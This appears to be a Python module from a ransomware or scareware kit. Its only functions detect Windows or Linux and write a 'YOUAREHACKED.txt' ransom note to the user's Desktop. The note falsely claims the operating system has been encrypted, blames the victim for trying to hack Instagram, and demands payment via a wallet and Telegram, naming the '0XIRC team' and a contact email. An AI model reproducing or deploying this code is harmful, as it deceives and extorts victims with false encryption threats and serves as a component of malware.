import os , platform


def orginalmode():
    addresFile = os.getlogin()
    with open(f"C:\\Users\\{addresFile}\\Desktop\\YOUAREHACKED.txt", 'w') as file:
        file.write('''

    Unfortunately, we encry-pted your entire operating system.
    We didn't want to do this, really. But we had to because of your malicious behavior!
    You want to h-a-ck other people's Instagram, which is illegal.
    I hope this was a good lesson for you! Don't do this again!

                        
    We will set up a wallet address for you. With a Telegram address. Pay the fee and send a screenshot to your Telegram ID.
    So that we can guide you on how to restore it! Thanks to the 0XIRC team

                   
                       _> Email : 0XIRC@proton.me  
                       _> " Send Message "
    ''')
            

def orginalmode2():
    addresFile = os.getlogin()
    with open(f"/home/{addresFile}/Desktop/YOUAREHACKED.txt", 'w') as file:
        file.write('''

Unfortunately, we encry-pted your entire operating system.
We didn't want to do this, really. But we had to because of your malicious behavior!
You want to h-a-ck other people's Instagram, which is illegal.
I hope this was a good lesson for you! Don't do this again!

                    
We will set up a wallet address for you. With a Telegram address. Pay the fee and send a screenshot to your Telegram ID.
So that we can guide you on how to restore it! Thanks to the 0XIRC team


                       _> Email : 0XIRC@proton.me  
                       _> " Send Message "
''')
            


def writerorginalsystem():


    if platform.system() == "Windows": 
        orginalmode()

    elif platform.system() == "Linux": 
        orginalmode2()
